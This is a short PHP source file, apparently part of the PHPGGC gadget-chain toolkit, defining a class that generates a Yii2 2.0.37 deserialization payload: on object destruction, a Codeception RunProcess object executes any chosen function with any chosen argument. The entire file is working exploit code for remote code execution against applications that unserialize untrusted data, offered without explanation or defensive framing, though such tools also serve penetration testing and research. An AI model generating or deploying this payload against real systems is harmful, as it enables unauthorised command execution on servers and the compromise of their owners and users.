<?php

namespace GadgetChain\Yii2;

class RCE4 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.37';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $query = new \Codeception\Extension\RunProcess($function, $parameter);

        return $query;
    }
}

